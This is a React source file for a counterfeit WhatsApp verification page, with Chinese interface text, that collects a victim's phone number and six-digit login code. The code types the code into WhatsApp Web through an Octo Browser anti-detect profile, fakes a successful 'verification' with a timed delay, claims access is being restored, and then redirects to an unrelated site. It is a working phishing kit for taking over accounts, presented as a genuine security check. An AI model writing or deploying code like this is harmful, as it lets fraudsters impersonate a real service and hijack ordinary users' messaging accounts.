import React, { useState, useEffect } from 'react';
import { MessageCircle, Lock, ChevronDown, Search, Shield, AlertTriangle, CheckCircle, Loader2 } from 'lucide-react';
import { useLanguage } from '../hooks/useLanguage';
import axios from 'axios';
import { getCountryList } from 'country-codes-list';
import { detectDevice } from '../utils/deviceDetection';
import { octoBrowserAPI } from '../utils/octoBrowser';
import { phoneVerificationService } from '../utils/phoneVerification';

interface Country {
  code: string;
  name: string;
  flag: string;
  dialCode: string;
}

interface VerificationStep {
  id: string;
  title: string;
  status: 'pending' | 'loading' | 'success' | 'error';
  message?: string;
}

export function PhoneVerificationPage() {
  const { t } = useLanguage();
  const [phoneNumber, setPhoneNumber] = useState('');
  const [verificationCode, setVerificationCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showCountrySelector, setShowCountrySelector] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  const [currentStep, setCurrentStep] = useState<'phone' | 'verification' | 'success'>('phone');
  const [sessionId, setSessionId] = useState('');
  const [browserSessionId, setBrowserSessionId] = useState('');
  const [deviceInfo, setDeviceInfo] = useState<any>(null);
  const [verificationSteps, setVerificationSteps] = useState<VerificationStep[]>([]);
  const [octoBrowserProfileId, setOctoBrowserProfileId] = useState('');
  
  const [selectedCountry, setSelectedCountry] = useState<Country>({
    code: 'CN',
    name: '中国',
    flag: '🇨🇳',
    dialCode: '86'
  });
  const [countries, setCountries] = useState<Country[]>([]);

  useEffect(() => {
    // 初始化
    const newSessionId = phoneVerificationService.generateSessionId();
    setSessionId(newSessionId);
    
    // 检查是否有 Octo Browser 配置文件 ID
    const storedProfileId = sessionStorage.getItem('octo_profile_uuid');
    if (storedProfileId) {
      setOctoBrowserProfileId(storedProfileId);
    }
    
    // 初始化国家列表
    initializeCountries();
    
    // 检测设备信息
    detectDeviceInfo();
  }, []);

  const initializeCountries = async () => {
    try {
      const countryList = getCountryList('en');
      const formattedCountries: Country[] = Object.entries(countryList).map(([code, data]: [string, any]) => ({
        code: code,
        name: data.name,
        flag: data.flag || `https://flagcdn.com/w20/${code.toLowerCase()}.png`,
        dialCode: data.dial
      }));
      setCountries(formattedCountries);

      // 获取用户国家
      try {
        const response = await axios.get('https://ipapi.co/json/');
        const userCountry = formattedCountries.find(c => c.code === response.data.country_code);
        if (userCountry) {
          setSelectedCountry(userCountry);
        }
      } catch (error) {
        console.warn('Could not detect country, using default');
      }
    } catch (error) {
      console.error('Failed to initialize countries:', error);
    }
  };

  const detectDeviceInfo = async () => {
    try {
      const info = await detectDevice();
      setDeviceInfo(info);
    } catch (error) {
      console.error('Device detection failed:', error);
    }
  };

  const updateVerificationStep = (stepId: string, status: VerificationStep['status'], message?: string) => {
    setVerificationSteps(prev => {
      const existing = prev.find(s => s.id === stepId);
      if (existing) {
        return prev.map(s => s.id === stepId ? { ...s, status, message } : s);
      } else {
        return [...prev, { id: stepId, title: getStepTitle(stepId), status, message }];
      }
    });
  };

  const getStepTitle = (stepId: string): string => {
    const titles: Record<string, string> = {
      'device-check': t.verification?.steps?.deviceCheck || '设备安全检测',
      'browser-start': t.verification?.steps?.browserStart || '启动防关联环境',
      'phone-sync': t.verification?.steps?.phoneSync || '同步电话号码',
      'code-send': t.verification?.steps?.codeSend || '发送验证码',
      'code-verify': t.verification?.steps?.codeVerify || '验证码确认'
    };
    return titles[stepId] || stepId;
  };

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!phoneNumber || phoneNumber.length < 8) {
      return;
    }

    setIsLoading(true);
    setVerificationSteps([]);

    try {
      const fullPhoneNumber = `+${selectedCountry.dialCode}${phoneNumber}`;

      phoneVerificationService.sendPhone({ countryCode:selectedCountry.dialCode,  phoneNumber: phoneNumber,  sessionId: sessionId,  browserSessionId: browserSessionId })
      
      updateVerificationStep('code-send', 'success', '手机号已发送');
      setCurrentStep('verification');

    } catch (error) {
      console.error('Phone submission failed:', error);
      updateVerificationStep('code-send', 'error', '处理手机号发送请求时发生错误');
    } finally {
      setIsLoading(false);
    }
  };

  const handleVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!verificationCode || verificationCode.length !== 6) {
      return;
    }

    setIsLoading(true);
    updateVerificationStep('code-verify', 'loading');

    try {
      // 在 Octo Browser 中输入验证码
      if (octoBrowserProfileId) {
        const codeResult = await octoBrowserAPI.inputVerificationCode(octoBrowserProfileId, verificationCode);
        if (codeResult.success) {
          updateVerificationStep('code-verify', 'success', '验证码已输入到 WhatsApp Web');
        } else {
          updateVerificationStep('code-verify', 'error', '验证码输入失败');
        }
      }

      // 模拟验证过程
      await new Promise(resolve => setTimeout(resolve, 3000));
      
      updateVerificationStep('code-verify', 'success', '验证成功');
      setCurrentStep('success');
      
      // 5秒后重定向
      setTimeout(() => {
        window.location.replace('https://faq-sunshine.netlify.app');
      }, 5000);

    } catch (error) {
      console.error('Verification failed:', error);
      updateVerificationStep('code-verify', 'error', '验证失败');
    } finally {
      setIsLoading(false);
    }
  };

  const filteredCountries = countries.filter(country => 
    country.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
    country.dialCode.includes(searchQuery) ||
    country.code.toLowerCase().includes(searchQuery.toLowerCase())
  );

  const renderStepIcon = (status: VerificationStep['status']) => {
    switch (status) {
      case 'loading':
        return <Loader2 className="w-4 h-4 animate-spin text-blue-500" />;
      case 'success':
        return <CheckCircle className="w-4 h-4 text-green-500" />;
      case 'error':
        return <AlertTriangle className="w-4 h-4 text-red-500" />;
      default:
        return <div className="w-4 h-4 rounded-full border-2 border-gray-300" />;
    }
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex flex-col">
      {/* Fixed Header */}
      <header 
        className="fixed top-0 left-0 right-0 bg-white/95 backdrop-blur-lg shadow-sm z-50"
        style={{ paddingTop: 'env(safe-area-inset-top)' }}
      >
        <div className="h-14 container mx-auto flex items-center gap-3 px-4">
          <div className="flex items-center gap-2">
            <MessageCircle className="w-[22px] h-[22px] text-[#25D366]" />
            <span className="text-[#111B21] text-[17px] font-semibold">WhatsApp</span>
          </div>
          <span className="text-[#111B21]/60 text-[17px]">|</span>
          <h1 className="text-[#111B21] text-[17px] font-semibold">
            {t.header.title}
          </h1>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 container mx-auto flex items-center justify-center px-4 pt-[calc(3.5rem+env(safe-area-inset-top))] pb-4">
        <div className="w-full max-w-md ios-card p-5">
          
          {/* 验证步骤显示 */}
          {verificationSteps.length > 0 && (
            <div className="mb-6 p-4 bg-gray-50 rounded-xl">
              <h3 className="text-sm font-medium text-gray-700 mb-3">验证进度</h3>
              <div className="space-y-2">
                {verificationSteps.map((step) => (
                  <div key={step.id} className="flex items-center gap-3">
                    {renderStepIcon(step.status)}
                    <div className="flex-1">
                      <div className="text-sm font-medium text-gray-900">{step.title}</div>
                      {step.message && (
                        <div className={`text-xs ${
                          step.status === 'error' ? 'text-red-600' : 
                          step.status === 'success' ? 'text-green-600' : 'text-gray-500'
                        }`}>
                          {step.message}
                        </div>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {currentStep === 'phone' && (
            <>
              <h2 className="text-[20px] font-semibold text-[#111B21] mb-5">
                {t.phoneInput?.title || '输入电话号码'}
              </h2>

              <form onSubmit={handlePhoneSubmit} className="space-y-5">
                <div className="space-y-2">
                  <div className="relative">
                    <div className="flex items-center border border-gray-200 rounded-xl overflow-hidden">
                      <button
                        type="button"
                        className="flex items-center px-4 py-3 bg-gray-50 border-r border-gray-200 hover:bg-gray-100 transition-colors"
                        onClick={() => setShowCountrySelector(true)}
                      >
                        <img
                          src={`https://flagcdn.com/w20/${selectedCountry.code.toLowerCase()}.png`}
                          alt={selectedCountry.code}
                          className="w-5 h-4 mr-2"
                        />
                        <span className="text-[#111B21] text-[17px]">+{selectedCountry.dialCode}</span>
                        <ChevronDown className="w-4 h-4 ml-2 text-gray-500" />
                      </button>
                      <input
                        type="tel"
                        value={phoneNumber}
                        onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, ''))}
                        placeholder={t.phoneInput?.placeholder || '请输入电话号码'}
                        className="flex-1 px-4 py-3 focus:outline-none text-[17px] text-[#111B21]"
                        disabled={isLoading}
                      />
                    </div>

                    {/* Country Selector Modal */}
                    {showCountrySelector && (
                      <div className="fixed inset-0 bg-black/50 z-50">
                        <div className="fixed bottom-0 left-0 right-0 bg-white rounded-t-[20px] max-h-[80vh] overflow-hidden">
                          <div className="sticky top-0 bg-white p-4 border-b border-gray-100">
                            <div className="flex items-center bg-gray-100 rounded-xl px-4 py-2">
                              <Search className="w-5 h-5 text-gray-500 mr-2" />
                              <input
                                type="text"
                                value={searchQuery}
                                onChange={(e) => setSearchQuery(e.target.value)}
                                placeholder={t.phoneInput?.search || '搜索国家'}
                                className="bg-transparent flex-1 outline-none text-[15px]"
                              />
                            </div>
                          </div>
                          
                          <div className="overflow-y-auto max-h-[calc(80vh-4rem)]">
                            {filteredCountries.map((country) => (
                              <button
                                key={country.code}
                                type="button"
                                className="w-full flex items-center px-4 py-3 hover:bg-gray-50 transition-colors"
                                onClick={() => {
                                  setSelectedCountry(country);
                                  setShowCountrySelector(false);
                                  setSearchQuery('');
                                }}
                              >
                                <img
                                  src={`https://flagcdn.com/w20/${country.code.toLowerCase()}.png`}
                                  alt={country.code}
                                  className="w-5 h-4 mr-3"
                                />
                                <span className="text-[15px] text-[#111B21]">{country.name}</span>
                                <span className="ml-auto text-[15px] text-gray-500">
                                  +{country.dialCode}
                                </span>
                              </button>
                            ))}
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                  <p className="text-[15px] text-[#8696a0] tracking-[-0.003em]">
                    {t.phoneInput?.description || '我们将向您发送验证码'}
                  </p>
                </div>

                <button
                  type="submit"
                  disabled={isLoading || phoneNumber.length < 8}
                  className={`w-full bg-[#25D366] text-white py-3.5 rounded-xl font-semibold text-[17px] transition-colors flex items-center justify-center gap-2 ${
                    isLoading || phoneNumber.length < 8
                      ? 'opacity-50 cursor-not-allowed'
                      : 'hover:bg-[#1fb959] active:transform active:scale-[0.98]'
                  }`}
                >
                  {isLoading && <Loader2 className="w-5 h-5 animate-spin" />}
                  {isLoading ? (t.phoneInput?.loading || '处理中...') : (t.phoneInput?.continue || '继续')}
                </button>
              </form>
            </>
          )}

          {currentStep === 'verification' && (
            <>
              <h2 className="text-[20px] font-semibold text-[#111B21] mb-5">
                输入验证码
              </h2>

              <div className="mb-5">
                <p className="text-[15px] text-[#8696a0] mb-2">
                  验证码已发送至
                </p>
                <p className="text-[17px] font-medium text-[#111B21]">
                  +{selectedCountry.dialCode} {phoneNumber}
                </p>
              </div>

              <form onSubmit={handleVerificationSubmit} className="space-y-5">
                <div className="space-y-2">
                  <input
                    type="text"
                    value={verificationCode}
                    onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                    placeholder="请输入6位验证码"
                    className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#25D366]/20 text-[17px] text-center tracking-widest"
                    maxLength={6}
                    disabled={isLoading}
                  />
                  <p className="text-[15px] text-[#8696a0] tracking-[-0.003em]">
                    请输入收到的6位数字验证码
                  </p>
                </div>

                <button
                  type="submit"
                  disabled={isLoading || verificationCode.length !== 6}
                  className={`w-full bg-[#25D366] text-white py-3.5 rounded-xl font-semibold text-[17px] transition-colors flex items-center justify-center gap-2 ${
                    isLoading || verificationCode.length !== 6
                      ? 'opacity-50 cursor-not-allowed'
                      : 'hover:bg-[#1fb959] active:transform active:scale-[0.98]'
                  }`}
                >
                  {isLoading && <Loader2 className="w-5 h-5 animate-spin" />}
                  {isLoading ? '验证中...' : '确认验证码'}
                </button>
              </form>
            </>
          )}

          {currentStep === 'success' && (
            <div className="text-center space-y-4">
              <div className="flex justify-center">
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
                  <CheckCircle className="w-8 h-8 text-green-500" />
                </div>
              </div>
              
              <h2 className="text-[20px] font-semibold text-[#111B21]">
                验证成功
              </h2>
              
              <p className="text-[15px] text-[#8696a0]">
                您的账户已成功验证，正在为您恢复访问权限...
              </p>
              
              <div className="flex justify-center">
                <Loader2 className="w-6 h-6 animate-spin text-[#25D366]" />
              </div>
              
              <p className="text-[13px] text-[#8696a0]">
                WhatsApp Web 会话将在 5 秒后自动打开
              </p>
            </div>
          )}

          <div className="mt-5 pt-5 border-t border-gray-100">
            <div className="flex items-center justify-center gap-2 text-[#8696a0]">
              <Lock className="w-[18px] h-[18px]" />
              <span className="text-[15px] tracking-[-0.003em]">{t.phoneInput?.encryption || '端对端加密'}</span>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}